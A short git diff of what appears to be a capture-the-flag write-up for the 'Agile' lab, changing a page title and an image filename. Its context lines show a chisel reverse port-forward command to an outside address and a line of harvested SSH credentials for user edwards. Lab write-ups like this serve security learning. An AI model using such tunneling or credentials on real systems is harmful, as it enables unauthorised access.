@@ -3,7 +3,7 @@ cover: ../.gitbook/assets/image (7).png
 coverY: 0
 ---
 
-# --Medium -- Agile
+# \[Medium] Agile
 
 ## **Info**
 
@@ -442,7 +442,7 @@ corum@agile:~/.tmp$ ./chisel client 10.10.16.21:12312 R:5555:127.0.0.1:5555
 
 And found SSH creds for edwards:
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ```
 agile edwards d07867c6267dcb5df0af
